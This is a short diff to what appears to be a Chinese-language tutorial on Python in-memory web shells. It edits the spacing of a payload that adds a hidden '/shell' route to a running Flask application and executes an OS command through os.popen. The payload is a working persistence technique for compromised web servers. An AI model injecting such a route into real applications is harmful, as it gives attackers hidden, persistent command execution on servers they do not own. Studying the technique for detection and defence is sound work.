@@ -15,7 +15,7 @@ python内存马的基本原理就是我们自定义一个路由，路由里面�
 payload：
 
 ```python
-sys.modules['__main__'].__dict__['app'].add_url_rule('/shell','shell',lambda :__import__('os').popen('dir').read())
+sys.modules['__main__'].__dict__['app'].add_url_rule('/shell','shell',lambda:__import__('os').popen('dir').read())
 ```
 
 ## 问题及解决
